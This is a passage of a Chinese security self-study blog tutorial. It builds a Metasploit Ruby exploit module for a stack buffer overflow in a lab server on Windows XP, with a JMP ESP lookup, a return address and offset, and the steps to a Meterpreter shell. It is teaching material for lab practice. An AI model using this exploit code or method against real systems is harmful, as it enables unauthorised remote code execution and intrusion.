+<p><a href="https://img.it610.com/image/info8/ca98d722efef4283a09a3b233ed90593.jpg"><img src="https://img.it610.com/image/info8/ca98d722efef4283a09a3b233ed90593.jpg" alt="\[网络安全自学篇\]
+五十三.Windows漏洞利用之Metasploit实现栈溢出攻击及反弹shell_第36张图片" /></a></p>
+
+<hr />
+
+<h1 id="五-通过metasploit查找jmp-esp指令的地址">五.通过Metasploit查找JMP ESP指令的地址</h1>
+
+<p>接下来，我们需要通过工具Metasploit下的msfbinscan查找JMP ESP指令的地址。</p>
+
+<blockquote>
+<p>Metasploit
+Framework(MSF)是一款开源安全漏洞检测工具，附带数千个已知的软件漏洞，并保持持续更新。Metasploit可以用来信息收集、漏洞探测、漏洞利用等渗透测试的全流程，被安全社区冠以“可以黑掉整个宇宙”之名。刚开始的Metasploit是采用Perl语言编写的，但是再后来的新版中，改成了用Ruby语言编写的了。在kali中，自带了Metasploit工具。我们接下来以大名鼎鼎的永恒之蓝MS17_010漏洞为切入点，讲解MSF框架的使用。</p>
+</blockquote>
+
+<p>推荐CSDN谢公子大神的文章，后面我也会学习分享一篇：<br />
+Metasploit Framework(MSF)的使用 - 谢公子</p>
+
+<p><strong>第一步，进入msf命令行，在Kali终端下输入“msfconsole”命令。</strong></p>
+
+<p>查看msfbinscan的帮助信息，如下：</p>
+
+<pre><code>msf &gt; msfbinscan -h
+[*] exec: msfbinscan -h
+
+Usage: /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/bin/msfbinscan [mode] &lt;options&gt; [targets]
+
+Modes:
+    -j, --jump [regA,regB,regC]      Search for jump equivalent instructions        [PE|ELF|MACHO]
+    -p, --poppopret                  Search for pop+pop+ret combinations            [PE|ELF|MACHO]
+    -r, --regex [regex]              Search for regex match                         [PE|ELF|MACHO]
+    -a, --analyze-address [address]  Display the code at the specified address      [PE|ELF]
+    -b, --analyze-offset [offset]    Display the code at the specified offset       [PE|ELF]
+    -f, --fingerprint                Attempt to identify the packer/compiler        [PE]
+    -i, --info                       Display detailed information about the image   [PE]
+    -R, --ripper [directory]         Rip all module resources to disk               [PE]
+        --context-map [directory]    Generate context-map files                     [PE]
+
+Options:
+    -A, --after [bytes]              Number of bytes to show after match (-a/-b)    [PE|ELF|MACHO]
+    -B, --before [bytes]             Number of bytes to show before match (-a/-b)   [PE|ELF|MACHO]
+    -I, --image-base [address]       Specify an alternate ImageBase                 [PE|ELF|MACHO]
+    -D, --disasm                     Disassemble the bytes at this address          [PE|ELF]
+    -F, --filter-addresses [regex]   Filter addresses based on a regular expression [PE]
+    -h, --help                       Show this message
+msf &gt; 
+</code></pre>
+
+<p><strong>第二步，输入如下命令来获取JMP ESP指令的地址。</strong></p>
+
+<pre><code>msf &gt; msfbinscan --jump esp ./ws2_32.dll
+[*] exec: msfbinscan -jump esp ./ws2_32.dll
+
+[./ws2_32.dll]
+0x71a22b53 push esp; ret
+msf &gt; 
+</code></pre>
+
+<p><a href="https://img.it610.com/image/info8/328792d256674efcb5eaa24bc9f1cce3.jpg"><img src="https://img.it610.com/image/info8/328792d256674efcb5eaa24bc9f1cce3.jpg" alt="\[网络安全自学篇\]
+五十三.Windows漏洞利用之Metasploit实现栈溢出攻击及反弹shell_第37张图片" /></a></p>
+
+<p><strong>可以看到，我们得出的JMP ESP指令的地址为：0x71a22b53。</strong></p>
+
+<hr />
+
+<h1 id="六-编写ruby攻击脚本及反弹shell">六.编写Ruby攻击脚本及反弹Shell</h1>
+
+<p>接着编写攻击脚本，其代码为bof_attack.rb，使用该脚本得到shell。源代码如下所示：</p>
+
+<pre><code>require 'msf/core'
+class MetasploitModule &lt; Msf::Exploit::Remote
+  Rank = NormalRanking
+  include Msf::Exploit::Remote::Tcp
+
+  def initialize(info = {})
+  super(update_info(info,
+    'Name'      =&gt; 'Stack Based Buffer Overflow Example',
+    'Description'   =&gt; %q{
+                    Stack Based Overflow Example Application Exploitation Module
+                   },
+    'Platform'      =&gt; 'Windows',
+    'Author'        =&gt; 'yanhan',
+
+    'Payload'       =&gt;
+                   {
+                   'space' =&gt; 1000,
+                           'BadChars' =&gt; &quot;\x00\xff&quot;
+                           },
+    'Targets'       =&gt;
+                   [
+                     [
+                  'Windows XP SP3',
+                  {'Ret' =&gt; find it, 'Offset' =&gt; find it}
+                 ]
+                   ],
+     'DisclosureDate' =&gt; '2019-05-25'
+  ))
+  end
+
+  def exploit
+    connect
+    buf = make_nops(target['Offset'])
+    buf = buf + [target['Ret']].pack('V') + make_nops(20) + payload.encoded
+    sock.put(buf)
+    handler
+    disconnect
+   end
+end
+</code></pre>
+
+<p><strong>需要注意核心代码：</strong></p>
+
+<pre><code>'Targets' =&gt;
+  [
+    ['Windows XP SP3', 
+     {'Ret' =&gt; 0x71a22b53, 'Offset' =&gt; 520}
+    ]
+  ],
+</code></pre>
+
+<p><strong>其中，Ret的值要和第五部分中找到的JMP ESP指令的地址一致，Offset的值要和第三步中找出的准确字节数一致。对应为：</strong></p>
+
+<ul>
+<li>‘Ret’ =&gt; 0x71a22b53</li>
+<li>‘Offset’ =&gt; 520</li>
+</ul>
+
+<p><a href="https://img.it610.com/image/info8/c9906a2dbecf447b914e7f189a1563c2.jpg"><img src="https://img.it610.com/image/info8/c9906a2dbecf447b914e7f189a1563c2.jpg" alt="\[网络安全自学篇\]
+五十三.Windows漏洞利用之Metasploit实现栈溢出攻击及反弹shell_第38张图片" /></a></p>
+
+<p><strong>第一步，将Ruby脚本上传至Kali系统。</strong></p>
+
+<p><a href="https://img.it610.com/image/info8/89538e84987442de8b04f764969815a8.jpg"><img src="https://img.it610.com/image/info8/89538e84987442de8b04f764969815a8.jpg" alt="\[网络安全自学篇\]
+五十三.Windows漏洞利用之Metasploit实现栈溢出攻击及反弹shell_第39张图片" /></a></p>
+
+<p><strong>第二步，将bof_attack.rb脚本上传到Kali的/usr/share/metasploit-
+framework/modules/exploits/windows/meterpreter/目录下。</strong></p>
+
+<p>下面代码是创建文件夹meterpreter，再复制Ruby脚本至该文件夹的过程，同时查看了各级目录的内容，加深读者的印象。</p>
+
+<pre><code>cd /usr/share
+ls
+
+cd metasploit-framework/modules/exploits
+ls
+
+cd windows
+ls
+</code></pre>
+
+<p><a href="https://img.it610.com/image/info8/9176b7f7d5f5496b889b514985b73e88.jpg"><img src="https://img.it610.com/image/info8/9176b7f7d5f5496b889b514985b73e88.jpg" alt="\[网络安全自学篇\]
+五十三.Windows漏洞利用之Metasploit实现栈溢出攻击及反弹shell_第40张图片" /></a></p>
+
+<p><a href="https://img.it610.com/image/info8/db93ea81ffb542c4b2f0bfa9a6aeba1c.jpg"><img src="https://img.it610.com/image/info8/db93ea81ffb542c4b2f0bfa9a6aeba1c.jpg" alt="\[网络安全自学篇\]
+五十三.Windows漏洞利用之Metasploit实现栈溢出攻击及反弹shell_第41张图片" /></a></p>
+
+<p>发现不存在该文件夹之后，调用“mkdir meterpreter”创建文件夹。</p>
+
+<pre><code>mkdir meterpreter
+cd meterpreter
+ls
+</code></pre>
+
+<p><a href="https://img.it610.com/image/info8/48ed4c610868409dba6131699494d501.jpg"><img src="https://img.it610.com/image/info8/48ed4c610868409dba6131699494d501.jpg" alt="\[网络安全自学篇\]
+五十三.Windows漏洞利用之Metasploit实现栈溢出攻击及反弹shell_第42张图片" /></a></p>
+
+<p>调用命令复制至该文件夹。</p>
+
+<pre><code>cp ./bof_attack.rb /usr/share/metasploit-framework/modules/exploits/windows/meterpreter/
+cd /usr/share/metasploit-framework/modules/exploits/windows/meterpreter/
+ls
+</code></pre>
+
+<p><a href="https://img.it610.com/image/info8/1f26763ed13c45fda680605af0be118b.jpg"><img src="https://img.it610.com/image/info8/1f26763ed13c45fda680605af0be118b.jpg" alt="在这里插入图片描述" /></a></p>
+
+<p><strong>第三步，运行攻击脚本并拿到了目标服务器的Meterpreter Shell。</strong></p>
+
+<ul>
+<li><p>启动msf控制台<br />
+msfconsole</p></li>
+
+<li><p>运行ruby脚本<br />
+use exploit/windows/meterpreter/bof_attack.rb</p></li>
+
+<li><p>设置目标服务器IP地址（Windows XP系统）<br />
+set RHOST 192.168.44.130</p></li>
+
+<li><p>设置目标服务器端口<br />
+set RPORT 4242</p></li>
+
+<li><p>查看配置信息<br />
+show options</p></li>
+</ul>
+
+<p><a href="https://img.it610.com/image/info8/e2f84411be0d44f2ba735beac8513667.jpg"><img src="https://img.it610.com/image/info8/e2f84411be0d44f2ba735beac8513667.jpg" alt="\[网络安全自学篇\]
+五十三.Windows漏洞利用之Metasploit实现栈溢出攻击及反弹shell_第43张图片" /></a></p>
+
+<p><strong>第四步，调用exploit命令对栈溢出漏洞进行攻击。再输入ls，可以看到我们目标XP服务器的E盘内容已经被提权，这就是所谓的Windows漏洞利用。</strong></p>
+
+<p><a href="https://img.it610.com/image/info8/6219e343a4134f3db29cc2037abbf7ef.jpg"><img src="https://img.it610.com/image/info8/6219e343a4134f3db29cc2037abbf7ef.jpg" alt="\[网络安全自学篇\]
+五十三.Windows漏洞利用之Metasploit实现栈溢出攻击及反弹shell_第44张图片" /></a></p>
+
+<p>补充谢公子大神的Exploit内容：</p>
+
+<p><a href="https://img.it610.com/image/info8/da851d28ba0e42f8abc95b058833c8e7.jpg"><img src="https://img.it610.com/image/info8/da851d28ba0e42f8abc95b058833c8e7.jpg" alt="\[网络安全自学篇\]
+五十三.Windows漏洞利用之Metasploit实现栈溢出攻击及反弹shell_第45张图片" /></a></p>
+
+<p>上面“ls”命令对应的内容即为XP系统E盘的文件，如下图所示：</p>
+
+<p><a href="https://img.it610.com/image/info8/ca385ba74b6540088de95ea356ca63a4.jpg"><img src="https://img.it610.com/image/info8/ca385ba74b6540088de95ea356ca63a4.jpg" alt="\[网络安全自学篇\]
+五十三.Windows漏洞利用之Metasploit实现栈溢出攻击及反弹shell_第46张图片" /></a></p>
+
+<p>需要注意，我们在执行这些操作过程中，XP系统的bof-server.exe需要一直运行，处于监听状态。某些情况可能会提示错误“Exploit
+completed, but no session was created”，如下图所示：</p>
+
+<p><a href="https://img.it610.com/image/info8/744117d52a0941c8b2d78d289181c416.jpg"><img src="https://img.it610.com/image/info8/744117d52a0941c8b2d78d289181c416.jpg" alt="\[网络安全自学篇\]
+五十三.Windows漏洞利用之Metasploit实现栈溢出攻击及反弹shell_第47张图片" /></a></p>
+
+<p>查看目标机的bof-server.exe命令行的缓冲区溢出并断开了监听。建议大家在目标机上多运行几次bof-
+server.exe和在Kali上多运行几次exploit，直到成功拿到Meterpreter Shell。</p>
+
+<p><a href="https://img.it610.com/image/info8/859c74087f9f4a88a2ff95a3ee7d9b32.jpg"><img src="https://img.it610.com/image/info8/859c74087f9f4a88a2ff95a3ee7d9b32.jpg" alt="\[网络安全自学篇\]
+五十三.Windows漏洞利用之Metasploit实现栈溢出攻击及反弹shell_第48张图片" /></a></p>
+
+<hr />
+
+<h1 id="七-总结">七.总结</h1>
+
+<p>文章写到这里，就介绍完毕，希望文章对您有所帮助，尤其是文章扩展的几个工具，您下来也可以详细学习。这篇文章主要讲解了如果搭建XP和Kali环境，并通过Windows漏洞实现栈溢出攻击，通过Metasploit反弹shell，从而Kali系统获取了XP系统的shell。该栈溢出的具体流程包括：</p>
+
+<ul>
+<li>任意非00的指令覆盖buffer和EBP</li>
+<li>从程序已经加载的dll中获取他们的jmp esp指令地址。</li>
+<li>使用jmp esp的指令地址覆盖ReturnAddress</li>
+<li>从下一行开始填充Shellcode</li>
+</ul>
+
+<p><a href="https://img.it610.com/image/info8/26131d7e981741a9ac9ad675f1b0a5d5.jpg"><img src="https://img.it610.com/image/info8/26131d7e981741a9ac9ad675f1b0a5d5.jpg" alt="\[网络安全自学篇\]
+五十三.Windows漏洞利用之Metasploit实现栈溢出攻击及反弹shell_第49张图片" /></a></p>
+
+<p>虽然是非常基础的一篇文章，但希望读者阅读并完成文章的实验。接下来作者将继续学习并分享更多的Windows漏洞利用或网络安全的文章。最后给出相关的命令。</p>
+
+<p><a href="https://img.it610.com/image/info8/8a17c88f57894d4a912c50fddd718f9b.jpg"><img src="https://img.it610.com/image/info8/8a17c88f57894d4a912c50fddd718f9b.jpg" alt="\[网络安全自学篇\]
+五十三.Windows漏洞利用之Metasploit实现栈溢出攻击及反弹shell_第50张图片" /></a></p>
+
+<p>希望这系列文章对您有所帮助，真的感觉自己技术好菜，要学的知识好多。这是第54篇原创的安全系列文章，从网络安全到系统安全，从木马病毒到后门劫持，从恶意代码到溯源分析，从渗透工具到二进制工具，还有Python安全、顶会论文、黑客比赛和漏洞分享。未知攻焉知防，人生漫漫其路远兮，作为初学者，自己真是爬着前行，感谢很多人的帮助，继续爬着，继续加油！</p>
+
+<p><strong>欢迎大家讨论，是否觉得这系列文章帮助到您！如果存在不足之处，还请海涵。任何建议都可以评论告知读者，共勉~</strong></p>
+
+<p>武汉加油！湖北加油！中国加油！！！</p>
+
+<p>(By:Eastmount 2020-03-01 凌晨1点写于贵阳 <a href="http://blog.csdn.net/eastmount">http://blog.csdn.net/eastmount</a> )</p>
+
+<hr />
+
+<p>参考文献：<br />
+[1] 《软件安全》课程Windows漏洞利用实验 YH师弟<br />
+[2] NAT模式和桥接模式实现局域网其他物理机器与Vmware虚拟机互相访问 - davidhzq<br />
+[3] 解读Linux安全机制之栈溢出保护 - macwe<br />
+[4] 渗透之——使用Metasploit实现对缓冲区栈的溢出攻击 - 冰河<br />
+[5] Metasploit Framework(MSF)的使用 - 谢公子<br />
+[6] msfconsole 控制台使用和操作 - xianjie0318<br />
+[7] smb(ms17-010)远程命令执行之msf - backlion<br />
+[8] <a href="https://github.com/eastmountyxz/Security-Software-Based">https://github.com/eastmountyxz/Security-Software-Based</a></p>
+
+        </div>
+
+        
+
+
+        
+
+<div class="post-archive">
+    <h2>See Also</h2>
+    <ul class="listing">
+        
+        <li><a href="/posts/007hadoop%E9%9B%86%E7%BE%A4%E9%85%8D%E7%BD%AEhadoop%E9%9B%86%E7%BE%A4%E7%9A%84%E5%90%AF%E5%8A%A8%E5%92%8C%E6%B5%8B%E8%AF%95ssh%E5%85%8D%E7%99%BB%E9%99%86%E9%85%8D%E7%BD%AEstartallshhdfs%E5%B8%B8%E7%94%A8%E7%9A%84shell/">007Hadoop集群配置Hadoop集群的启动和测试SSH免登陆配置startallshhdfs常用的shell</a></li>
+        
+        <li><a href="/posts/009shell%E8%84%9A%E6%9C%AC%E4%B8%8B%E6%9D%A1%E4%BB%B6%E6%B5%8B%E8%AF%95eqne/">009Shell脚本下条件测试eqne</a></li>
+        
+        <li><a href="/posts/00pythonmanagepyshell%E5%92%8Cpython%E7%9A%84%E5%88%86%E6%9E%90/">00Pythonmanagepyshell和Python的分析</a></li>
+        
+        <li><a href="/posts/010zookeeper%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5zookeeper%E7%9A%84%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BAzookeeper%E7%9A%84shell%E5%91%BD%E4%BB%A4/">010Zookeeper的基本概念Zookeeper的集群搭建Zookeeper的shell命令</a></li>
+        
+        <li><a href="/posts/018dockerfileshell/">018DockerfileSHELL</a></li>
+        
+    </ul>
+</div>
+
+
+        <div class="post-meta meta-tags">
+            
+            <ul class="clearfix">
+                
+                <li><a href='https://zaina.newban.cn/tags/shell'>shell</a></li>
+                
+            </ul>
+            
+        </div>
+    </article>
+    
+    
+
+    
+    
+</div>
+
+                    <footer id="footer">
+    <div>
+        &copy; 2020 <a href="https://zaina.newban.cn">开发者问答集锦 By </a>
+        
+    </div>
+    <br />
+    <div>
+        <div class="github-badge">
+            <a href="https://gohugo.io/" target="_black" rel="nofollow"><span class="badge-subject">Powered by</span><span class="badge-value bg-blue">Hugo</span></a>
+        </div>
+        <div class="github-badge">
+            <a href="https://www.flysnow.org/" target="_black"><span class="badge-subject">Design by</span><span class="badge-value bg-brightgreen">飞雪无情</span></a>
+        </div>
+        <div class="github-badge">
+            <a href="https://github.com/flysnow-org/maupassant-hugo" target="_black"><span class="badge-subject">Theme</span><span class="badge-value bg-yellowgreen">Maupassant</span></a>
+        </div>
+    </div>
+</footer>
+
+
+    
+    <script type="text/javascript">
+        window.MathJax = {
+            tex2jax: {
+                inlineMath: [['$', '$']],
+                processEscapes: true
+                }
+            };
+    </script>
+    <script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML' async></script>
+
+<a id="rocket" href="#top"></a>
+<script type="text/javascript" src='/js/totop.js?v=0.0.0' async=""></script>
+
+
+
+    <script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+
+
+
+
+                </div>
+
+                <div id="secondary">
+    <section class="widget">
+        <form id="search" action='https://zaina.newban.cn/search/' method="get" accept-charset="utf-8" target="_blank" _lpchecked="1">
+      
+      <input type="text" name="q" maxlength="20" placeholder="Search">
+      <input type="hidden" name="sitesearch" value="https://zaina.newban.cn">
+      <button type="submit" class="submit icon-search"></button>
+</form>
+    </section>
+    
+    <section class="widget">
+        <h3 class="widget-title">最近文章</h3>
+<ul class="widget-list">
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/001rubyruby%E4%B8%AD%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%AE%9E%E4%BE%8B%E5%8F%98%E9%87%8F%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E7%B1%BB%E5%8F%98%E9%87%8Fsymbol%E5%AF%B9%E6%AF%94/" title="001rubyRuby中全局变量实例变量局部变量类变量Symbol对比">001rubyRuby中全局变量实例变量局部变量类变量Symbol对比</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/007hadoop%E9%9B%86%E7%BE%A4%E9%85%8D%E7%BD%AEhadoop%E9%9B%86%E7%BE%A4%E7%9A%84%E5%90%AF%E5%8A%A8%E5%92%8C%E6%B5%8B%E8%AF%95ssh%E5%85%8D%E7%99%BB%E9%99%86%E9%85%8D%E7%BD%AEstartallshhdfs%E5%B8%B8%E7%94%A8%E7%9A%84shell/" title="007Hadoop集群配置Hadoop集群的启动和测试SSH免登陆配置startallshhdfs常用的shell">007Hadoop集群配置Hadoop集群的启动和测试SSH免登陆配置startallshhdfs常用的shell</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/009shell%E8%84%9A%E6%9C%AC%E4%B8%8B%E6%9D%A1%E4%BB%B6%E6%B5%8B%E8%AF%95eqne/" title="009Shell脚本下条件测试eqne">009Shell脚本下条件测试eqne</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/00pythonmanagepyshell%E5%92%8Cpython%E7%9A%84%E5%88%86%E6%9E%90/" title="00Pythonmanagepyshell和Python的分析">00Pythonmanagepyshell和Python的分析</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/010zookeeper%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5zookeeper%E7%9A%84%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BAzookeeper%E7%9A%84shell%E5%91%BD%E4%BB%A4/" title="010Zookeeper的基本概念Zookeeper的集群搭建Zookeeper的shell命令">010Zookeeper的基本概念Zookeeper的集群搭建Zookeeper的shell命令</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/018dockerfileshell/" title="018DockerfileSHELL">018DockerfileSHELL</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E5%85%A5%E9%97%A801bashshell%E7%89%B9%E6%80%A7/" title="01Shell入门01bashShell特性">01Shell入门01bashShell特性</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E5%8F%98%E9%87%8F/" title="01Shell变量">01Shell变量</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E5%9F%BA%E7%A1%80%E6%A6%82%E8%BF%B0%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C%E6%96%B9%E5%BC%8Fbash%E5%9F%BA%E6%9C%AC%E5%8A%9F%E8%83%BD/" title="01Shell基础概述脚本执行方式Bash基本功能">01Shell基础概述脚本执行方式Bash基本功能</a>
+    </li>
+    
+    <li>
+        <a href="https://zaina.newban.cn/posts/01shell%E7%BC%96%E7%A8%8Bhelloworld/" title="01shell编程helloworld">01shell编程helloworld</a>
+    </li>
+    
+</ul>
+    </section>
+
+    
+
+    <section class="widget">
+        <h3 class="widget-title"><a href="/categories">分类</a></h3>
+<ul class="widget-list">
+    
+</ul>
+    </section>
+
+    <section class="widget">
+        <h3 class="widget-title"><a href="/tags">标签</a></h3>
+<div class="tagcloud">
+    
+    <a href="https://zaina.newban.cn/tags/ruby/">ruby</a>
+    
+    <a href="https://zaina.newban.cn/tags/shell/">shell</a>
+    
+</div>
+    </section>
+
+    
+
+    <section class="widget">
+        <h3 class="widget-title">其它</h3>
+        <ul class="widget-list">
+            <li><a href="https://zaina.newban.cn/index.xml">文章 RSS</a></li>
+        </ul>
+    </section>
+</div>
+            </div>
+        </div>
+    </div>
+</body>
+
+</html>
